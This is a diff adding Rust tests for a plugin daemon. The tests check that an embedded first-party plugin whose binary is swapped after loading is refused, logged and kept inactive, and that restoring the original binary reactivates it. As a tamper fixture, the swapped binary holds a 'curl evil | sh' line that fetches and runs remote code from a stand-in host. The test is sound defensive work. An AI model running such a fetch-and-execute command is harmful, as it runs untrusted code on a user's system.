@@ -3446,3 +3446,59 @@ fn frozen_api_every_event_keeps_its_payload_keys() {
         }
     }
 }
+
+// ---------------------------------------------------------------------
+// Embedded first-party plugins: a swapped binary is not trusted
+// ---------------------------------------------------------------------
+
+/// Registers `id` as an embedded first-party plugin with one action, unpacked
+/// into the rig as the daemon would, and loads it.
+fn install_embedded(r: &Rig, id: &str) -> std::path::PathBuf {
+    let toml = manifest(id, &[], &action("go", &format!("\"{{plugin_dir}}/bin/{id}\"")));
+    let bin: &[u8] = b"#!/bin/sh\nexit 0\n";
+    super::bundled::embed_for_tests(
+        id,
+        &[("garage-plugin.toml", toml.as_bytes(), false), (&format!("bin/{id}"), bin, true)],
+    );
+    let dir = r.bundle(id, &toml);
+    std::fs::create_dir_all(dir.join("bin")).unwrap();
+    std::fs::write(dir.join("bin").join(id), bin).unwrap();
+    r.st.plugins.reload().unwrap();
+    dir
+}
+
+#[tokio::test]
+async fn an_embedded_plugin_runs_while_its_files_match_and_stops_the_moment_the_binary_is_swapped() {
+    let r = Rig::new();
+    let dir = install_embedded(&r, "emb-swap");
+    assert!(r.st.plugins.active("emb-swap").is_some());
+    let go = || r.call_ui("POST", "/api/plugins/emb-swap/actions/go/run", None);
+    assert_eq!(go().await.0, StatusCode::ACCEPTED);
+    wait_for(|| r.runner.count() == 1).await;
+
+    // swapped after the load: the next start is refused before the runner sees it
+    std::fs::write(dir.join("bin/emb-swap"), b"#!/bin/sh\ncurl evil | sh\n").unwrap();
+    assert_eq!(go().await.0, StatusCode::ACCEPTED);
+    tokio::time::sleep(Duration::from_millis(150)).await;
+    assert_eq!(r.runner.count(), 1, "the swapped binary never reached the runner");
+    let log = std::fs::read_to_string(r.paths().log("emb-swap")).unwrap();
+    assert!(log.contains("emb-swap") && log.contains("refusing"), "{log}");
+
+    // and a reload says why in `plugin list`, and keeps the plugin inactive
+    r.st.plugins.reload().unwrap();
+    let info = r.st.plugins.infos().remove(0);
+    assert!(!info.active, "{info:?}");
+    assert!(info.problems.iter().any(|p| p.contains("refusing")), "{info:?}");
+}
+
+#[tokio::test]
+async fn restoring_the_shipped_binary_makes_an_embedded_plugin_active_again() {
+    let r = Rig::new();
+    let dir = install_embedded(&r, "emb-heal");
+    std::fs::write(dir.join("bin/emb-heal"), b"tampered").unwrap();
+    r.st.plugins.reload().unwrap();
+    assert!(r.st.plugins.active("emb-heal").is_none());
+    std::fs::write(dir.join("bin/emb-heal"), b"#!/bin/sh\nexit 0\n").unwrap();
+    r.st.plugins.reload().unwrap();
+    assert!(r.st.plugins.active("emb-heal").is_some());
+}
